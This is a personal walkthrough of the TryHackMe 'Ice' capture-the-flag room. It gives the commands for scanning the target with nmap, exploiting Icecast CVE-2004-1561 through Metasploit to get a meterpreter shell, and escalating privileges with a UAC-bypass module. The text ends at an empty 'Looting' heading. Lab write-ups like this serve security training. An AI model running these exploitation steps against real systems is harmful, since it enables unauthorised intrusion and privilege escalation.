# Ice

## Recon
Just started off with an aggressive, all ports scan
`sudo nmap -A -vvv -p- -oN aggressivenmapallports {machine ip}`

### What port is Microsoft Remote desktop on?
Had to search the ports for this as the service name/version didn't specify (not sure if this is always the case?)
port 3389 had service 'ssl/ms-wbt-server?', which when googled found that it was microsoft remote desktop.

### What service is runing on port 8000?
Icecast streaming media server 

### What does nmap identify as the hostname of the machine? 
dark-pc

## Gain access
### What type of vulnerability is the cvedetails listing with a score of 7.5 for this version of icecast?
Couldn't actually find a listing of the version of icecast in my scan, but just tried a few vulnerabilities and found the one in question:
'execute code overflow'

### What's the cve number for this vulnerability?
CVE-2004-1561

### What's the metasploit path for this exploit?
`msfconsole`
`search icecast`
only one result, exploit/windows/http/icecast_header
`use 0`

### What is the only required setting that is blank for the exploit?
`show options`
ans is RHOSTS and the RPORT is already correct so we:
`set RHOSTS <machine ip>`
`exploit`

## Escalate
### What's the name of the shell we have now?
meterpreter
more about meterpreter https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/

### What user was running the icecast process?
`help` in meterpreter shell lists out commands
`getuid` gets our current username, Dark-PC\Dark - meaning our user is Dark

### What build of Windows is the system?
`sysinfo` shows us various info including os & build / service packs
this line 'OS              : Windows 7 (6.1 Build 7601, Service Pack 1).'
shows us the answer is 7601

### finer details: what is the architecture of the process we're running?
The system architecture is x64 as shown in the sysinfo, but we don't know for certain that the process is the same
`getpid` gives us our process id, 2260
`ps` shows us a list of processes, track down 2260 and we see:
'2260  1328  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe'
the 'arch' cvolumn shows us x86

Answer is x64 though? I guess it wanted the machine architecture and not the process

### run the local exploit suggester
in the meterpreter:
'run post/multi/recon/local_exploit_suggester'

### What's the first result?
'exploit/windows/local/ikeext_service: The target appears to be vulnerable.'
answer is 'exploit/windows/local/ikeext_service'

### background session, load the next exploit (first result from prev q)
ctrl-z to background
`use exploit/windows/local/bypassuac_eventvwr'
`show options` - shows us we just need the session number
`sessions` gets active sessions, our session id is 1
`set SESSION 1`

### Now that we've set our session number, more options in the options menu
`show options` - we now see our external ip is the lhost rather than the tryhackme one
`set LHOST {thm ip}`
`exploit`

### command getprivs lets us verify we have expanded permissions, what permission allows us to take ownership of files?`
SeTakeOwnershipPrivilege looks right, and it is

## Looting
